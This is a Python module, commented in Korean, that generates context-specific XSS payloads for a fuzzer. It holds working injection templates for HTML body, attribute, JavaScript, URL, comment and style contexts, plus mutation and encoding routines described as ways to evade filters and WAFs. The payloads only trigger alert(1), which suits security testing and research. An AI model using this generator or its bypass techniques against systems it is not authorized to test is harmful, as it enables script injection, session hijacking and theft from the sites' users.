"""
Payload Generator - 컨텍스트 기반 XSS 페이로드 생성

Attack Grammar를 활용하여 각 컨텍스트에 맞는 효과적인 XSS 페이로드를 생성합니다.

핵심 기능:
1. 컨텍스트별 페이로드 템플릿 (Attack Grammar)
2. 페이로드 변이 (Mutation)
3. 인코딩 변형 (URL, HTML Entity, Unicode 등)
4. WAF 우회 기법 적용
"""

from dataclasses import dataclass, field
from typing import List, Dict, Optional, Set
import random
import urllib.parse
import html
import base64
import re


# ========================================
# 데이터 클래스
# ========================================

@dataclass
class PayloadTemplate:
    """페이로드 템플릿"""
    context_type: str           # 적용 가능한 컨텍스트
    template: str               # 페이로드 템플릿
    description: str            # 설명
    severity: str = "high"      # 심각도: critical, high, medium, low
    tags: List[str] = field(default_factory=list)  # 태그 (예: "event_handler", "tag_injection")

    def to_dict(self) -> dict:
        return {
            'context_type': self.context_type,
            'template': self.template,
            'description': self.description,
            'severity': self.severity,
            'tags': self.tags
        }


@dataclass
class GeneratedPayload:
    """생성된 페이로드"""
    payload: str                # 실제 페이로드
    context_type: str           # 컨텍스트 타입
    encoding: Optional[str]     # 사용된 인코딩 (있으면)
    mutation: Optional[str]     # 사용된 변이 기법
    description: str = ""       # 설명

    def to_dict(self) -> dict:
        return {
            'payload': self.payload,
            'context_type': self.context_type,
            'encoding': self.encoding,
            'mutation': self.mutation,
            'description': self.description
        }


# ========================================
# Attack Grammar - 컨텍스트별 페이로드 템플릿
# ========================================

class AttackGrammar:
    """
    Attack Grammar - 컨텍스트별 XSS 페이로드 템플릿

    KameleonFuzz의 Attack Grammar 개념을 구현.
    각 컨텍스트에서 효과적인 페이로드 패턴을 정의합니다.
    """

    # 컨텍스트 타입 (context_analyzer.py와 동일)
    CONTEXT_HTML_BODY = "html_body"
    CONTEXT_HTML_ATTRIBUTE = "html_attribute"
    CONTEXT_JAVASCRIPT = "javascript"
    CONTEXT_JAVASCRIPT_STRING = "js_string"
    CONTEXT_URL = "url"
    CONTEXT_COMMENT = "comment"
    CONTEXT_STYLE = "style"

    def __init__(self):
        """Attack Grammar 초기화 - 템플릿 로드"""
        self.templates = self._load_templates()

    def _load_templates(self) -> Dict[str, List[PayloadTemplate]]:
        """
        컨텍스트별 페이로드 템플릿 로드

        Returns:
            Dict[str, List[PayloadTemplate]]: 컨텍스트별 템플릿 목록
        """
        templates = {
            # HTML 본문 컨텍스트
            self.CONTEXT_HTML_BODY: [
                PayloadTemplate(
                    context_type=self.CONTEXT_HTML_BODY,
                    template="<img src=x onerror=alert(1)>",
                    description="이미지 onerror 이벤트",
                    severity="critical",
                    tags=["event_handler", "tag_injection"]
                ),
                PayloadTemplate(
                    context_type=self.CONTEXT_HTML_BODY,
                    template="<svg onload=alert(1)>",
                    description="SVG onload 이벤트",
                    severity="critical",
                    tags=["event_handler", "svg"]
                ),
                PayloadTemplate(
                    context_type=self.CONTEXT_HTML_BODY,
                    template="<script>alert(1)</script>",
                    description="Script 태그 직접 삽입",
                    severity="critical",
                    tags=["script_tag"]
                ),
                PayloadTemplate(
                    context_type=self.CONTEXT_HTML_BODY,
                    template="<iframe src=javascript:alert(1)>",
                    description="iframe javascript 프로토콜",
                    severity="high",
                    tags=["iframe", "javascript_protocol"]
                ),
                PayloadTemplate(
                    context_type=self.CONTEXT_HTML_BODY,
                    template="<body onload=alert(1)>",
                    description="body onload 이벤트",
                    severity="high",
                    tags=["event_handler"]
                ),
                PayloadTemplate(
                    context_type=self.CONTEXT_HTML_BODY,
                    template="<details open ontoggle=alert(1)>",
                    description="details ontoggle 이벤트",
                    severity="high",
                    tags=["event_handler", "html5"]
                ),
            ],

            # HTML 속성 컨텍스트
            self.CONTEXT_HTML_ATTRIBUTE: [
                PayloadTemplate(
                    context_type=self.CONTEXT_HTML_ATTRIBUTE,
                    template='" onmouseover=alert(1) x="',
                    description="속성 탈출 후 이벤트 핸들러",
                    severity="critical",
                    tags=["attribute_escape", "event_handler"]
                ),
                PayloadTemplate(
                    context_type=self.CONTEXT_HTML_ATTRIBUTE,
                    template="' onmouseover=alert(1) x='",
                    description="싱글 쿼트 탈출 후 이벤트",
                    severity="critical",
                    tags=["attribute_escape", "event_handler"]
                ),
                PayloadTemplate(
                    context_type=self.CONTEXT_HTML_ATTRIBUTE,
                    template='" autofocus onfocus=alert(1) x="',
                    description="autofocus + onfocus",
                    severity="critical",
                    tags=["attribute_escape", "autofocus"]
                ),
                PayloadTemplate(
                    context_type=self.CONTEXT_HTML_ATTRIBUTE,
                    template='"><img src=x onerror=alert(1)>',
                    description="태그 종료 후 새 태그 삽입",
                    severity="critical",
                    tags=["tag_break", "tag_injection"]
                ),
                PayloadTemplate(
                    context_type=self.CONTEXT_HTML_ATTRIBUTE,
                    template="' accesskey=x onclick=alert(1) x='",
                    description="accesskey를 이용한 사용자 상호작용",
                    severity="high",
                    tags=["accesskey"]
                ),
            ],

            # JavaScript 코드 컨텍스트
            self.CONTEXT_JAVASCRIPT: [
                PayloadTemplate(
                    context_type=self.CONTEXT_JAVASCRIPT,
                    template=";alert(1)//",
                    description="세미콜론으로 명령 종료 후 실행",
                    severity="critical",
                    tags=["code_injection"]
                ),
                PayloadTemplate(
                    context_type=self.CONTEXT_JAVASCRIPT,
                    template=";alert(1);",
                    description="세미콜론으로 명령 삽입",
                    severity="critical",
                    tags=["code_injection"]
                ),
                PayloadTemplate(
                    context_type=self.CONTEXT_JAVASCRIPT,
                    template="'-alert(1)-'",
                    description="산술 연산자를 이용한 실행",
                    severity="high",
                    tags=["arithmetic_operator"]
                ),
                PayloadTemplate(
                    context_type=self.CONTEXT_JAVASCRIPT,
                    template="/**/alert(1)//",
                    description="주석으로 감싼 코드",
                    severity="medium",
                    tags=["comment_injection"]
                ),
            ],

            # JavaScript 문자열 컨텍스트
            self.CONTEXT_JAVASCRIPT_STRING: [
                PayloadTemplate(
                    context_type=self.CONTEXT_JAVASCRIPT_STRING,
                    template="';alert(1)//",
                    description="문자열 탈출 후 코드 실행",
                    severity="critical",
                    tags=["string_escape"]
                ),
                PayloadTemplate(
                    context_type=self.CONTEXT_JAVASCRIPT_STRING,
                    template='";alert(1)//',
                    description="더블 쿼트 탈출 후 실행",
                    severity="critical",
                    tags=["string_escape"]
                ),
                PayloadTemplate(
                    context_type=self.CONTEXT_JAVASCRIPT_STRING,
                    template="`;alert(1)//",
                    description="백틱 탈출 (템플릿 리터럴)",
                    severity="critical",
                    tags=["string_escape", "template_literal"]
                ),
                PayloadTemplate(
                    context_type=self.CONTEXT_JAVASCRIPT_STRING,
                    template="'-alert(1)-'",
                    description="산술 연산자 이용",
                    severity="high",
                    tags=["arithmetic_operator"]
                ),
                PayloadTemplate(
                    context_type=self.CONTEXT_JAVASCRIPT_STRING,
                    template="</script><script>alert(1)</script>",
                    description="script 태그 종료 후 재시작",
                    severity="critical",
                    tags=["tag_break"]
                ),
            ],

            # URL 컨텍스트
            self.CONTEXT_URL: [
                PayloadTemplate(
                    context_type=self.CONTEXT_URL,
                    template="javascript:alert(1)",
                    description="javascript 프로토콜",
                    severity="critical",
                    tags=["javascript_protocol"]
                ),
                PayloadTemplate(
                    context_type=self.CONTEXT_URL,
                    template="data:text/html,<script>alert(1)</script>",
                    description="data URI scheme",
                    severity="critical",
                    tags=["data_uri"]
                ),
                PayloadTemplate(
                    context_type=self.CONTEXT_URL,
                    template="javascript:alert`1`",
                    description="템플릿 리터럴 사용",
                    severity="high",
                    tags=["javascript_protocol", "template_literal"]
                ),
                PayloadTemplate(
                    context_type=self.CONTEXT_URL,
                    template="JaVaScRiPt:alert(1)",
                    description="대소문자 혼합 우회",
                    severity="high",
                    tags=["case_variation"]
                ),
            ],

            # 주석 컨텍스트
            self.CONTEXT_COMMENT: [
                PayloadTemplate(
                    context_type=self.CONTEXT_COMMENT,
                    template="--><img src=x onerror=alert(1)><!--",
                    description="주석 탈출 후 태그 삽입",
                    severity="critical",
                    tags=["comment_escape", "tag_injection"]
                ),
                PayloadTemplate(
                    context_type=self.CONTEXT_COMMENT,
                    template="--><script>alert(1)</script><!--",
                    description="주석 탈출 후 스크립트",
                    severity="critical",
                    tags=["comment_escape"]
                ),
            ],

            # Style 컨텍스트
            self.CONTEXT_STYLE: [
                PayloadTemplate(
                    context_type=self.CONTEXT_STYLE,
                    template="</style><script>alert(1)</script>",
                    description="style 태그 종료 후 스크립트",
                    severity="critical",
                    tags=["tag_break"]
                ),
                PayloadTemplate(
                    context_type=self.CONTEXT_STYLE,
                    template="expression(alert(1))",
                    description="CSS expression (IE)",
                    severity="medium",
                    tags=["ie_only", "expression"]
                ),
                PayloadTemplate(
                    context_type=self.CONTEXT_STYLE,
                    template='url("javascript:alert(1)")',
                    description="CSS url with javascript",
                    severity="high",
                    tags=["javascript_protocol"]
                ),
            ],
        }

        return templates

    def get_templates(self, context_type: str) -> List[PayloadTemplate]:
        """
        특정 컨텍스트의 템플릿 가져오기

        Args:
            context_type: 컨텍스트 타입

        Returns:
            List[PayloadTemplate]: 템플릿 목록
        """
        return self.templates.get(context_type, [])


# ========================================
# 페이로드 변이 엔진
# ========================================

class PayloadMutator:
    """
    페이로드 변이 엔진

    기본 페이로드를 다양한 방법으로 변형하여
    필터링을 우회하고 탐지율을 높입니다.
    """

    @staticmethod
    def case_variation(payload: str) -> List[str]:
        """
        대소문자 변형

        Args:
            payload: 원본 페이로드

        Returns:
            List[str]: 변형된 페이로드 목록
        """
        variations = []

        # 1. 모두 대문자
        variations.append(payload.upper())

        # 2. 모두 소문자
        variations.append(payload.lower())

        # 3. 랜덤 대소문자 혼합
        random_case = ''.join(
            c.upper() if random.random() > 0.5 else c.lower()
            for c in payload
        )
        variations.append(random_case)

        # 4. 태그와 이벤트만 대소문자 혼합
        # 예: <sCrIpT>alert(1)</ScRiPt>
        import re
        def random_case_replace(match):
            return ''.join(
                c.upper() if random.random() > 0.5 else c.lower()
                for c in match.group(0)
            )

        tag_varied = re.sub(r'<[^>]+>', random_case_replace, payload)
        variations.append(tag_varied)

        return variations

    @staticmethod
    def add_comments(payload: str) -> List[str]:
        """
        주석 삽입 (HTML/JS 주석으로 난독화)

        Args:
            payload: 원본 페이로드

        Returns:
            List[str]: 주석이 삽입된 페이로드 목록
        """
        variations = []

        # HTML 주석 삽입
        # <img src=x onerror=alert(1)> → <img/**/src=x/**/onerror=alert(1)>
        commented = payload.replace(' ', '/**/')
        variations.append(commented)

        # 태그 내부에 주석
        # <img src=x> → <img<!-----> src=x>
        if '<' in payload:
            variations.append(payload.replace('<', '<<!---->'))

        # alert 함수 호출에 주석
        # alert(1) → alert/**/(1)
        if 'alert(' in payload:
            variations.append(payload.replace('alert(', 'alert/**/(/'))

        return variations

    @staticmethod
    def add_null_bytes(payload: str) -> List[str]:
        """
        NULL 바이트 삽입

        Args:
            payload: 원본 페이로드

        Returns:
            List[str]: NULL 바이트가 삽입된 페이로드
        """
        variations = []

        # \x00 삽입
        variations.append(payload.replace('alert', 'ale\\x00rt'))
        variations.append(payload.replace('<', '<\\x00'))

        return variations

    @staticmethod
    def character_substitution(payload: str) -> List[str]:
        """
        문자 치환

        Args:
            payload: 원본 페이로드

        Returns:
            List[str]: 문자가 치환된 페이로드 목록
        """
        variations = []

        # alert → confirm, prompt
        variations.append(payload.replace('alert', 'confirm'))
        variations.append(payload.replace('alert', 'prompt'))

        # 괄호 변형
        # alert(1) → alert`1`
        if 'alert(1)' in payload:
            variations.append(payload.replace('alert(1)', 'alert`1`'))
            variations.append(payload.replace('alert(1)', r'alert\`1\`'))

        # 공백 변형
        # src=x → src%20=%20x
        variations.append(payload.replace(' ', '%20'))
        variations.append(payload.replace(' ', '\t'))
        variations.append(payload.replace(' ', '\n'))

        return variations


# ========================================
# 인코딩 변환기
# ========================================

class PayloadEncoder:
    """
    페이로드 인코딩 변환기

    다양한 인코딩 방식으로 페이로드를 변환하여
    WAF 우회를 시도합니다.
    """

    @staticmethod
    def url_encode(payload: str, double: bool = False) -> str:
        """
        URL 인코딩

        Args:
            payload: 원본 페이로드
            double: 이중 인코딩 여부

        Returns:
            str: URL 인코딩된 페이로드
        """
        encoded = urllib.parse.quote(payload)
        if double:
            encoded = urllib.parse.quote(encoded)
        return encoded

    @staticmethod
    def html_entity_encode(payload: str) -> str:
        """
        HTML 엔티티 인코딩

        Args:
            payload: 원본 페이로드

        Returns:
            str: HTML 엔티티로 인코딩된 페이로드
        """
        return html.escape(payload)

    @staticmethod
    def html_entity_encode_all(payload: str) -> str:
        """
        모든 문자를 HTML 엔티티로 인코딩

        Args:
            payload: 원본 페이로드

        Returns:
            str: 모든 문자가 엔티티로 인코딩된 페이로드
        """
        return ''.join(f'&#x{ord(c):x};' for c in payload)

    @staticmethod
    def unicode_encode(payload: str) -> str:
        """
        Unicode 인코딩

        Args:
            payload: 원본 페이로드

        Returns:
            str: Unicode 인코딩된 페이로드
        """
        return ''.join(f'\\u{ord(c):04x}' for c in payload)

    @staticmethod
    def base64_encode(payload: str) -> str:
        """
        Base64 인코딩 (data URI에서 사용)

        Args:
            payload: 원본 페이로드

        Returns:
            str: Base64 인코딩된 페이로드
        """
        return base64.b64encode(payload.encode()).decode()


# ========================================
# 메인 페이로드 생성기
# ========================================

class PayloadGenerator:
    """
    XSS 페이로드 생성기

    컨텍스트 분석 결과를 바탕으로 효과적인 XSS 페이로드를 생성합니다.
    """

    def __init__(self):
        """초기화"""
        self.grammar = AttackGrammar()
        self.mutator = PayloadMutator()
        self.encoder = PayloadEncoder()

    def generate_for_context(
        self,
        context_type: str,
        max_payloads: int = 10,
        apply_mutations: bool = True,
        apply_encoding: bool = False
    ) -> List[GeneratedPayload]:
        """
        특정 컨텍스트에 맞는 페이로드 생성

        Args:
            context_type: 컨텍스트 타입
            max_payloads: 생성할 최대 페이로드 수
            apply_mutations: 변이 적용 여부
            apply_encoding: 인코딩 적용 여부

        Returns:
            List[GeneratedPayload]: 생성된 페이로드 목록
        """
        payloads = []

        # 1. 기본 템플릿 가져오기
        templates = self.grammar.get_templates(context_type)

        for template in templates[:max_payloads]:
            # 기본 페이로드 추가
            payloads.append(GeneratedPayload(
                payload=template.template,
                context_type=context_type,
                encoding=None,
                mutation=None,
                description=template.description
            ))

            # 2. 변이 적용
            if apply_mutations:
                # 대소문자 변형
                for varied in self.mutator.case_variation(template.template)[:2]:
                    payloads.append(GeneratedPayload(
                        payload=varied,
                        context_type=context_type,
                        encoding=None,
                        mutation="case_variation",
                        description=f"{template.description} (대소문자 변형)"
                    ))

                # 주석 삽입
                for commented in self.mutator.add_comments(template.template)[:2]:
                    payloads.append(GeneratedPayload(
                        payload=commented,
                        context_type=context_type,
                        encoding=None,
                        mutation="comment_insertion",
                        description=f"{template.description} (주석 삽입)"
                    ))

                # 문자 치환
                for substituted in self.mutator.character_substitution(template.template)[:2]:
                    payloads.append(GeneratedPayload(
                        payload=substituted,
                        context_type=context_type,
                        encoding=None,
                        mutation="character_substitution",
                        description=f"{template.description} (문자 치환)"
                    ))

            # 3. 인코딩 적용
            if apply_encoding:
                # URL 인코딩
                payloads.append(GeneratedPayload(
                    payload=self.encoder.url_encode(template.template),
                    context_type=context_type,
                    encoding="url",
                    mutation=None,
                    description=f"{template.description} (URL 인코딩)"
                ))

                # HTML 엔티티 인코딩 (일부만)
                payloads.append(GeneratedPayload(
                    payload=self.encoder.html_entity_encode(template.template),
                    context_type=context_type,
                    encoding="html_entity",
                    mutation=None,
                    description=f"{template.description} (HTML 엔티티)"
                ))

            # 최대 개수 제한
            if len(payloads) >= max_payloads:
                break

        return payloads[:max_payloads]

    def generate_batch(
        self,
        contexts: Dict[str, int],
        apply_mutations: bool = True,
        apply_encoding: bool = False
    ) -> Dict[str, List[GeneratedPayload]]:
        """
        여러 컨텍스트에 대해 배치로 페이로드 생성

        Args:
            contexts: {컨텍스트_타입: 생성할_개수} 딕셔너리
            apply_mutations: 변이 적용 여부
            apply_encoding: 인코딩 적용 여부

        Returns:
            Dict[str, List[GeneratedPayload]]: 컨텍스트별 페이로드
        """
        results = {}

        for context_type, count in contexts.items():
            results[context_type] = self.generate_for_context(
                context_type=context_type,
                max_payloads=count,
                apply_mutations=apply_mutations,
                apply_encoding=apply_encoding
            )

        return results


# ========================================
# 헬퍼 함수
# ========================================

def print_payloads(payloads: List[GeneratedPayload]):
    """생성된 페이로드를 보기 좋게 출력"""
    print(f"\n{'='*60}")
    print(f"생성된 페이로드: {len(payloads)}개")
    print(f"{'='*60}\n")

    for i, p in enumerate(payloads, 1):
        print(f"[{i}] {p.description}")
        print(f"    컨텍스트: {p.context_type}")
        if p.mutation:
            print(f"    변이: {p.mutation}")
        if p.encoding:
            print(f"    인코딩: {p.encoding}")
        print(f"    페이로드: {p.payload}\n")
